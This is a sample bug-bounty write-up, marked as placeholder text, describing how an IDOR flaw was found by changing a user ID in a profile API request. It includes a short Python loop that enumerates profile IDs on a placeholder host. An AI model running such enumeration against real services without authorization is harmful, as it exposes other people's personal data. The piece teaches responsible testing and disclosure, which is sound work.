> This is a sample article. Replace it with your own writeup.

## Intro

When I started bug bounty, the advice I heard most was: **"Check the simple things."** This is how I found my first confirmed bug — an IDOR (Insecure Direct Object Reference).

## Looking at the target

The user profile was loaded with a request like this:

```http
GET /api/v1/users/10234/profile HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJhbGciOi...
```

## The bug

Changing `10234` to `10235` returned another user's data. There was **no ownership check** on the server side.

```python
import requests

for uid in range(10230, 10240):
    r = requests.get(f"https://app.example.com/api/v1/users/{uid}/profile",
                     headers={"Authorization": "Bearer <TOKEN>"})
    print(uid, r.status_code)
```

## Impact

| Data | Exposed? |
|---|---|
| Full name | Yes |
| Email | Yes |
| Phone | Yes |

## Report and outcome

I reported it following the program's rules; it was confirmed and fixed within 48 hours.

## Lessons

- Test every ID parameter
- Understand manually before automating
- Write clear, reproducible reports
